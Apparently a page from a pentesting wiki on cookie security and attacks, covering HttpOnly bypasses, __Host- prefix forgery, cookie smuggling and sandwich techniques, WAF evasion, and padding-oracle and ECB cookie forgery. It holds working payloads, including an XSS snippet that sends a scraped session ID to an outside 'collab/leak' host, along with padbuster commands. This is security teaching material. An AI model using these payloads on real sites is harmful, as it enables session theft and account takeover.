_body: "# Cookies Hacking\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Cookie Attributes\n\nCookies come with\
  \ several attributes that control their behavior in the user's browser. Here’s a rundown of these attributes in a more passive\
  \ voice:\n\n### Expires and Max-Age\n\nThe expiry date of a cookie is determined by the `Expires` attribute. Conversely,\
  \ the `Max-age` attribute defines the time in seconds until a cookie is deleted. **Opt for `Max-age` as it reflects more\
  \ modern practices.**\n\n### Domain\n\nThe hosts to receive a cookie are specified by the `Domain` attribute. By default,\
  \ this is set to the host that issued the cookie, not including its subdomains. However, when the `Domain` attribute is\
  \ explicitly set, it encompasses subdomains as well. This makes the specification of the `Domain` attribute a less restrictive\
  \ option, useful for scenarios where cookie sharing across subdomains is necessary. For instance, setting `Domain=mozilla.org`\
  \ makes cookies accessible on its subdomains like `developer.mozilla.org`.\n\n### Path\n\nA specific URL path that must\
  \ be present in the requested URL for the `Cookie` header to be sent is indicated by the `Path` attribute. This attribute\
  \ considers the `/` character as a directory separator, allowing for matches in subdirectories as well.\n\n### Ordering\
  \ Rules\n\nWhen two cookies bear the same name, the one chosen for sending is based on:\n\n- The cookie matching the longest\
  \ path in the requested URL.\n- The most recently set cookie if the paths are identical.\n\n### SameSite\n\n- The `SameSite`\
  \ attribute dictates whether cookies are sent on requests originating from third-party domains. It offers three settings:\n\
  \  - **Strict**: Restricts the cookie from being sent on third-party requests.\n  - **Lax**: Allows the cookie to be sent\
  \ with GET requests initiated by third-party websites.\n  - **None**: Permits the cookie to be sent from any third-party\
  \ domain.\n\nRemember, while configuring cookies, understanding these attributes can help ensure they behave as expected\
  \ across different scenarios.\n\n| **Request Type** | **Example Code**                   | **Cookies Sent When** |\n| ----------------\
  \ | ---------------------------------- | --------------------- |\n| Link             | \\<a href=\"...\">\\</a>        \
  \       | NotSet\\*, Lax, None   |\n| Prerender        | \\<link rel=\"prerender\" href=\"..\"/> | NotSet\\*, Lax, None\
  \   |\n| Form GET         | \\<form method=\"GET\" action=\"...\">  | NotSet\\*, Lax, None   |\n| Form POST        | \\\
  <form method=\"POST\" action=\"...\"> | NotSet\\*, None        |\n| iframe           | \\<iframe src=\"...\">\\</iframe>\
  \      | NotSet\\*, None        |\n| AJAX             | $.get(\"...\")                       | NotSet\\*, None        |\n\
  | Image            | \\<img src=\"...\">                   | NetSet\\*, None        |\n\nTable from [Invicti](https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/)\
  \ and slightly modified.\\\nA cookie with _**SameSite**_ attribute will **mitigate CSRF attacks** where a logged session\
  \ is needed.\n\n**\\*Notice that from Chrome80 (feb/2019) the default behaviour of a cookie without a cookie samesite**\
  \ **attribute will be lax** ([https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/](https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/)).\\\
  \nNotice that temporary, after applying this change, the **cookies without a SameSite** **policy** in Chrome will be **treated\
  \ as None** during the **first 2 minutes and then as Lax for top-level cross-site POST request.**\n\n## Cookies Flags\n\n\
  ### HttpOnly\n\nThis avoids the **client** to access the cookie (Via **Javascript** for example: `document.cookie`)\n\n\
  #### **Bypasses**\n\n- If the page is **sending the cookies as the response** of a requests (for example in a **PHPinfo**\
  \ page), it's possible to abuse the XSS to send a request to this page and **steal the cookies** from the response (check\
  \ an example in [https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/](https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/)).\n\
  - This could be Bypassed with **TRACE** **HTTP** requests as the response from the server (if this HTTP method is available)\
  \ will reflect the cookies sent. This technique is called **Cross-Site Tracking**.\n  - This technique is avoided by **modern\
  \ browsers by not permitting sending a TRACE** request from JS. However, some bypasses to this have been found in specific\
  \ software like sending `\\r\\nTRACE` instead of `TRACE` to IE6.0 SP2.\n- Another way is the exploitation of zero/day vulnerabilities\
  \ of the browsers.\n- It's possible to **overwrite HttpOnly cookies** by performing a Cookie Jar overflow attack:\n\n\n\
  {{#ref}}\ncookie-jar-overflow.md\n{{#endref}}\n\n- It's possible to use [**Cookie Smuggling**](#cookie-smuggling) attack\
  \ to exfiltrate these cookies\n- If any server-side endpoint echoes the raw session ID in the HTTP response (e.g., inside\
  \ HTML comments or a debug block), you can bypass HttpOnly by using an XSS gadget to fetch that endpoint, regex the secret,\
  \ and exfiltrate it. Example XSS payload pattern:\n\n```js\n// Extract content between <!-- startscrmprint --> ... <!--\
  \ stopscrmprint -->\nconst re = /<!-- startscrmprint -->([\\s\\S]*?)<!-- stopscrmprint -->/;\nfetch('/index.php?module=Touch&action=ws')\n\
  \  .then(r => r.text())\n  .then(t => { const m = re.exec(t); if (m) fetch('https://collab/leak', {method:'POST', body:\
  \ JSON.stringify({leak: btoa(m[1])})}); });\n```\n\n### Secure\n\nThe request will **only** send the cookie in an HTTP request\
  \ only if the request is transmitted over a secure channel (typically **HTTPS**).\n\n## Cookies Prefixes\n\nCookies prefixed\
  \ with `__Secure-` are required to be set alongside the `secure` flag from pages that are secured by HTTPS.\n\nFor cookies\
  \ prefixed with `__Host-`, several conditions must be met:\n\n- They must be set with the `secure` flag.\n- They must originate\
  \ from a page secured by HTTPS.\n- They are forbidden from specifying a domain, preventing their transmission to subdomains.\n\
  - The path for these cookies must be set to `/`.\n\nIt is important to note that cookies prefixed with `__Host-` are not\
  \ allowed to be sent to superdomains or subdomains. This restriction aids in isolating application cookies. Thus, employing\
  \ the `__Host-` prefix for all application cookies can be considered a good practice for enhancing security and isolation.\n\
  \n### Overwriting cookies\n\nSo, one of the protection of `__Host-` prefixed cookies is to prevent them from being overwritten\
  \ from subdomains. Preventing for example [**Cookie Tossing attacks**](cookie-tossing.md). In the talk [**Cookie Crumbles:\
  \ Unveiling Web Session Integrity Vulnerabilities**](https://www.youtube.com/watch?v=F_wAzF4a7Xg) ([**paper**](https://www.usenix.org/system/files/usenixsecurity23-squarcina.pdf))\
  \ it's presented that it was possible to set \\_\\_HOST- prefixed cookies from subdomain, by tricking the parser, for example,\
  \ adding \"=\" at the beggining or at the beginig and the end...:\n\n<figure><img src=\"../../images/image (6) (1) (1) (1)\
  \ (1).png\" alt=\"\"><figcaption></figcaption></figure>\n\nOr in PHP it was possible to add **other characters at the beginning**\
  \ of the cookie name that were going to be **replaced by underscore** characters, allowing to overwrite `__HOST-` cookies:\n\
  \n<figure><img src=\"../../images/image (7) (1) (1) (1) (1).png\" alt=\"\" width=\"373\"><figcaption></figcaption></figure>\n\
  \n\n#### Unicode whitespace cookie-name smuggling (prefix forgery)\n\nAbuse discrepancies between browser and server parsing\
  \ by prepending a Unicode whitespace code point to the cookie name. The browser won’t consider the name to literally start\
  \ with `__Host-`/`__Secure-`, so it allows setting from a subdomain. If the backend trims/normalizes leading Unicode whitespace\
  \ on cookie keys, it will see the protected name and may overwrite the high-privilege cookie.\n\n- PoC from a subdomain\
  \ that can set parent-domain cookies:\n\n```js\ndocument.cookie = `${String.fromCodePoint(0x2000)}__Host-name=injected;\
  \ Domain=.example.com; Path=/;`;\n```\n\n- Typical backend behavior that enables the issue:\n  - Frameworks that trim/normalize\
  \ cookie keys. In Django, Python’s `str.strip()` removes a wide range of Unicode whitespace code points, causing the name\
  \ to normalize to `__Host-name`.\n  - Commonly trimmed code points include: U+0085 (NEL, 133), U+00A0 (NBSP, 160), U+1680\
  \ (5760), U+2000–U+200A (8192–8202), U+2028 (8232), U+2029 (8233), U+202F (8239), U+205F (8287), U+3000 (12288).\n  - Many\
  \ frameworks resolve duplicate cookie names as “last wins”, so the attacker-controlled normalized cookie value overwrites\
  \ the legitimate one.\n\n- Browser differences matter:\n  - Safari blocks multibyte Unicode whitespace in cookie names (e.g.,\
  \ rejects U+2000) but still permits single-byte U+0085 and U+00A0, which many backends trim. Cross-test across browsers.\n\
  \n- Impact: Enables overwriting of `__Host-`/`__Secure-` cookies from less-trusted contexts (subdomains), which can lead\
  \ to XSS (if reflected), CSRF token override, and session fixation.\n\n- On-the-wire vs server view example (U+2000 present\
  \ in name):\n\n```\nCookie: __Host-name=Real; â€€__Host-name=<img src=x onerror=alert(1)>;\n```\n\nMany backends split/parse\
  \ and then trim, resulting in the normalized `__Host-name` taking the attacker’s value.\n\n#### Legacy `$Version=1` cookie\
  \ splitting on Java backends (prefix bypass)\n\nSome Java stacks (e.g., Tomcat/Jetty-style) still enable legacy RFC 2109/2965\
  \ parsing when the `Cookie` header starts with `$Version=1`. This can cause the server to reinterpret a single cookie string\
  \ as multiple logical cookies and accept a forged `__Host-` entry that was originally set from a subdomain or even over\
  \ insecure origin.\n\n- PoC forcing legacy parsing:\n\n```js\ndocument.cookie = `$Version=1,__Host-name=injected; Path=/somethingreallylong/;\
  \ Domain=.example.com;`;\n```\n\n- Why it works:\n  - Client-side prefix checks apply during set, but server-side legacy\
  \ parsing later splits and normalizes the header, bypassing the intent of `__Host-`/`__Secure-` prefix guarantees.\n\n-\
  \ Where to try: Tomcat, Jetty, Undertow, or frameworks that still honor RFC 2109/2965 attributes. Combine with duplicate-name\
  \ overwrite semantics.\n\n#### Duplicate-name last-wins overwrite primitive\n\nWhen two cookies normalize to the same name,\
  \ many backends (including Django) use the last occurrence. After smuggling/legacy-splitting produces two `__Host-*` names,\
  \ the attacker-controlled one will typically win.\n\n#### Detection and tooling\n\nUse Burp Suite to probe for these conditions:\n\
  \n- Try multiple leading Unicode whitespace code points: U+2000, U+0085, U+00A0 and observe whether the backend trims and\
  \ treats the name as prefixed.\n- Send `$Version=1` first in the Cookie header and check if the backend performs legacy\
  \ splitting/normalization.\n- Observe duplicate-name resolution (first vs last wins) by injecting two cookies that normalize\
  \ to the same name.\n- Burp Custom Action to automate this: [CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)\n\
  \n> Tip: These techniques exploit RFC 6265’s octet-vs-string gap: browsers send bytes; servers decode and may normalize/trim.\
  \ Mismatches in decoding and normalization are the core of the bypass.\n\n## Cookies Attacks\n\nIf a custom cookie contains\
  \ sensitive data check it (specially if you are playing a CTF), as it might be vulnerable.\n\n### Decoding and Manipulating\
  \ Cookies\n\nSensitive data embedded in cookies should always be scrutinized. Cookies encoded in Base64 or similar formats\
  \ can often be decoded. This vulnerability allows attackers to alter the cookie's content and impersonate other users by\
  \ encoding their modified data back into the cookie.\n\n### Session Hijacking\n\nThis attack involves stealing a user's\
  \ cookie to gain unauthorized access to their account within an application. By using the stolen cookie, an attacker can\
  \ impersonate the legitimate user.\n\n### Session Fixation\n\nIn this scenario, an attacker tricks a victim into using a\
  \ specific cookie to log in. If the application does not assign a new cookie upon login, the attacker, possessing the original\
  \ cookie, can impersonate the victim. This technique relies on the victim logging in with a cookie supplied by the attacker.\n\
  \nIf you found an **XSS in a subdomain** or you **control a subdomain**, read:\n\n\n{{#ref}}\ncookie-tossing.md\n{{#endref}}\n\
  \n### Session Donation\n\nHere, the attacker convinces the victim to use the attacker's session cookie. The victim, believing\
  \ they are logged into their own account, will inadvertently perform actions in the context of the attacker's account.\n\
  \nIf you found an **XSS in a subdomain** or you **control a subdomain**, read:\n\n\n{{#ref}}\ncookie-tossing.md\n{{#endref}}\n\
  \n### [JWT Cookies](../hacking-jwt-json-web-tokens.md)\n\nClick on the previous link to access a page explaining possible\
  \ flaws in JWT.\n\nJSON Web Tokens (JWT) used in cookies can also present vulnerabilities. For in-depth information on potential\
  \ flaws and how to exploit them, accessing the linked document on hacking JWT is recommended.\n\n### Cross-Site Request\
  \ Forgery (CSRF)\n\nThis attack forces a logged-in user to execute unwanted actions on a web application in which they're\
  \ currently authenticated. Attackers can exploit cookies that are automatically sent with every request to the vulnerable\
  \ site.\n\n### Empty Cookies\n\n(Check further details in the[original research](https://blog.ankursundara.com/cookie-bugs/))\
  \ Browsers permit the creation of cookies without a name, which can be demonstrated through JavaScript as follows:\n\n```js\n\
  document.cookie = \"a=v1\"\ndocument.cookie = \"=test value;\" // Setting an empty named cookie\ndocument.cookie = \"b=v2\"\
  \n```\n\nThe result in the sent cookie header is `a=v1; test value; b=v2;`. Intriguingly, this allows for the manipulation\
  \ of cookies if an empty name cookie is set, potentially controlling other cookies by setting the empty cookie to a specific\
  \ value:\n\n```js\nfunction setCookie(name, value) {\n  document.cookie = `${name}=${value}`\n}\n\nsetCookie(\"\", \"a=b\"\
  ) // Setting the empty cookie modifies another cookie's value\n```\n\nThis leads to the browser sending a cookie header\
  \ interpreted by every web server as a cookie named `a` with a value `b`.\n\n#### Chrome Bug: Unicode Surrogate Codepoint\
  \ Issue\n\nIn Chrome, if a Unicode surrogate codepoint is part of a set cookie, `document.cookie` becomes corrupted, returning\
  \ an empty string subsequently:\n\n```js\ndocument.cookie = \"\\ud800=meep\"\n```\n\nThis results in `document.cookie` outputting\
  \ an empty string, indicating permanent corruption.\n\n#### Cookie Smuggling Due to Parsing Issues\n\n(Check further details\
  \ in the[original research](https://blog.ankursundara.com/cookie-bugs/)) Several web servers, including those from Java\
  \ (Jetty, TomCat, Undertow) and Python (Zope, cherrypy, web.py, aiohttp, bottle, webob), mishandle cookie strings due to\
  \ outdated RFC2965 support. They read a double-quoted cookie value as a single value even if it includes semicolons, which\
  \ should normally separate key-value pairs:\n\n```\nRENDER_TEXT=\"hello world; JSESSIONID=13371337; ASDF=end\";\n```\n\n\
  #### Cookie Injection Vulnerabilities\n\n(Check further details in the[original research](https://blog.ankursundara.com/cookie-bugs/))\
  \ The incorrect parsing of cookies by servers, notably Undertow, Zope, and those using Python's `http.cookie.SimpleCookie`\
  \ and `http.cookie.BaseCookie`, creates opportunities for cookie injection attacks. These servers fail to properly delimit\
  \ the start of new cookies, allowing attackers to spoof cookies:\n\n- Undertow expects a new cookie immediately after a\
  \ quoted value without a semicolon.\n- Zope looks for a comma to start parsing the next cookie.\n- Python's cookie classes\
  \ start parsing on a space character.\n\nThis vulnerability is particularly dangerous in web applications relying on cookie-based\
  \ CSRF protection, as it allows attackers to inject spoofed CSRF-token cookies, potentially bypassing security measures.\
  \ The issue is exacerbated by Python's handling of duplicate cookie names, where the last occurrence overrides earlier ones.\
  \ It also raises concerns for `__Secure-` and `__Host-` cookies in insecure contexts and could lead to authorization bypasses\
  \ when cookies are passed to back-end servers susceptible to spoofing.\n\n### Cookies $version\n\n#### WAF Bypass\n\nAccording\
  \ to [**this blogpost**](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie), it might be possible\
  \ to use the cookie attribute **`$Version=1`** to make the backend use an old logic to parse the cookie due to the **RFC2109**.\
  \ Moreover, other values just as **`$Domain`** and **`$Path`** can be used to modify the behaviour of the backend with the\
  \ cookie.\n\n#### Cookie Sandwich Attack\n\nAccording to [**this blogpost**](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique)\
  \ it's possible to use the cookie sandwich technique to steal HttpOnly cookies. These are the requirements and steps:\n\n\
  - Find a place were an apparent useless **cookie is refected in the response**\n- **Create a cookie called `$Version`**\
  \ with value `1` (ou can do this in a XSS attack from JS) with a more specific path so it gets the initial possition (some\
  \ frameworks like python don’t need this step)\n- **Create the cookie that is reflected** with a value that leaves an **open\
  \ double quotes** and with a specific path so it’s positioned in the cookie db after the previous one (`$Version`)\n- Then,\
  \ the legit cookie will go next in the order\n- **Create a dummy cookie that closes the double quotse** inside its value\n\
  \nThis way the victim cookie gets trapped inside the new cookie version 1 and will get reflected whenever it’s reflected.\n\
  e.g. from the post:\n\n```javascript\ndocument.cookie = `$Version=1;`;\ndocument.cookie = `param1=\"start`;\n// any cookies\
  \ inside the sandwich will be placed into param1 value server-side\ndocument.cookie = `param2=end\";`;\n```\n\n### WAF bypasses\n\
  \n#### Cookies $version\n\nCheck the previous section.\n\n#### Bypassing value analysis with quoted-string encoding\n\n\
  This parsing indicate to unescape escaped values inside the cookies, so \"\\a\" becomes \"a\". This can be useful to bypass\
  \ WAFS as:\n\n- `eval('test') => forbidden`\n- `\"\\e\\v\\a\\l\\(\\'\\t\\e\\s\\t\\'\\)\" => allowed`\n\n#### Bypassing cookie-name\
  \ blocklists\n\nIn the RFC2109 it's indicated that a **comma can be used as a separator between cookie values**. And also\
  \ it's possible to add **spaces and tabs before an after the equal sign**. Therefore a cookie like `$Version=1; foo=bar,\
  \ abc = qux` doesn't generate the cookie `\"foo\":\"bar, admin = qux\"` but the cookies `foo\":\"bar\"` and `\"admin\":\"\
  qux\"`. Notice how 2 cookies are generated and how admin got removed the space before and after the equal sign.\n\n####\
  \ Bypassing value analysis with cookie splitting\n\nFinally different backdoors would join in a string different cookies\
  \ passed in different cookie headers like in:\n\n```\nGET / HTTP/1.1\nHost: example.com\nCookie: param1=value1;\nCookie:\
  \ param2=value2;\n```\n\nWhich could allow to bypass a WAF like in this example:\n\n```\nCookie: name=eval('test//\nCookie:\
  \ comment')\n\nResulting cookie: name=eval('test//, comment') => allowed\n```\n\n### Extra Vulnerable Cookies Checks\n\n\
  #### **Basic checks**\n\n- The **cookie** is the **same** every time you **login**.\n- Log out and try to use the same cookie.\n\
  - Try to log in with 2 devices (or browsers) to the same account using the same cookie.\n- Check if the cookie has any information\
  \ in it and try to modify it\n- Try to create several accounts with almost the same username and check if you can see similarities.\n\
  - Check the \"**remember me**\" option if it exists to see how it works. If it exists and could be vulnerable, always use\
  \ the cookie of **remember me** without any other cookie.\n- Check if the previous cookie works even after you change the\
  \ password.\n\n#### **Advanced cookies attacks**\n\nIf the cookie remains the same (or almost) when you log in, this probably\
  \ means that the cookie is related to some field of your account (probably the username). Then you can:\n\n- Try to create\
  \ a lot of **accounts** with usernames very **similar** and try to **guess** how the algorithm is working.\n- Try to **bruteforce\
  \ the username**. If the cookie saves only as an authentication method for your username, then you can create an account\
  \ with username \"**Bmin**\" and **bruteforce** every single **bit** of your cookie because one of the cookies that you\
  \ will try will the one belonging to \"**admin**\".\n- Try **Padding** **Oracle** (you can decrypt the content of the cookie).\
  \ Use **padbuster**.\n\n**Padding Oracle - Padbuster examples**\n\n```bash\npadbuster <URL/path/when/successfully/login/with/cookie>\
  \ <COOKIE> <PAD[8-16]>\n# When cookies and regular Base64\npadbuster http://web.com/index.php u7bvLewln6PJPSAbMb5pFfnCHSEd6olf\
  \ 8 -cookies auth=u7bvLewln6PJPSAbMb5pFfnCHSEd6olf\n\n# If Base64 urlsafe or hex-lowercase or hex-uppercase --encoding parameter\
  \ is needed, for example:\npadBuster http://web.com/home.jsp?UID=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6\n7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6\
  \ 8 -encoding 2\n```\n\nPadbuster will make several attempts and will ask you which condition is the error condition (the\
  \ one that is not valid).\n\nThen it will start decrypting the cookie (it may take several minutes)\n\nIf the attack has\
  \ been successfully performed, then you could try to encrypt a string of your choice. For example, if you would want to\
  \ **encrypt** **user=administrator**\n\n```\npadbuster http://web.com/index.php 1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w==\
  \ 8 -cookies thecookie=1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== -plaintext user=administrator\n```\n\nThis\
  \ execution will give you the cookie correctly encrypted and encoded with the string **user=administrator** inside.\n\n\
  **CBC-MAC**\n\nMaybe a cookie could have some value and could be signed using CBC. Then, the integrity of the value is the\
  \ signature created by using CBC with the same value. As it is recommended to use as IV a null vector, this type of integrity\
  \ checking could be vulnerable.\n\n**The attack**\n\n1. Get the signature of username **administ** = **t**\n2. Get the signature\
  \ of username **rator\\x00\\x00\\x00 XOR t** = **t'**\n3. Set in the cookie the value **administrator+t'** (**t'** will\
  \ be a valid signature of **(rator\\x00\\x00\\x00 XOR t) XOR t** = **rator\\x00\\x00\\x00**\n\n**ECB**\n\nIf the cookie\
  \ is encrypted using ECB it could be vulnerable.\\\nWhen you log in the cookie that you receive has to be always the same.\n\
  \n**How to detect and attack:**\n\nCreate 2 users with almost the same data (username, password, email, etc.) and try to\
  \ discover some pattern inside the given cookie\n\nCreate a user called for example \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"\
  \ and check if there is any pattern in the cookie (as ECB encrypts with the same key every block, the same encrypted bytes\
  \ could appear if the username is encrypted).\n\nThere should be a pattern (with the size of a used block). So, knowing\
  \ how are a bunch of \"a\" encrypted you can create a username: \"a\"\\*(size of the block)+\"admin\". Then, you could delete\
  \ the encrypted pattern of a block of \"a\" from the cookie. And you will have the cookie of the username \"admin\".\n\n\
  ### Static-key cookie forgery (symmetric encryption of predictable IDs)\n\nSome applications mint authentication cookies\
  \ by encrypting only a predictable value (e.g., the numeric user ID) under a global, hard-coded symmetric key, then encoding\
  \ the ciphertext (hex/base64). If the key is static per product (or per install), anyone can forge cookies for arbitrary\
  \ users offline and bypass authentication.\n\nHow to test/forge\n- Identify the cookie(s) that gate auth, e.g., COOKIEID\
  \ and ADMINCOOKIEID.\n- Determine cipher/encoding. In one real-world case the app used IDEA with a constant 16-byte key\
  \ and returned the ciphertext as hex.\n- Verify by encrypting your own user ID and comparing with the issued cookie. If\
  \ it matches, you can mint cookies for any target ID (1 often maps to the first admin).\n- Set the forged value directly\
  \ as the cookie and browse; no credentials are needed.\n\n<details>\n<summary>Minimal Java PoC (IDEA + hex) used in the\
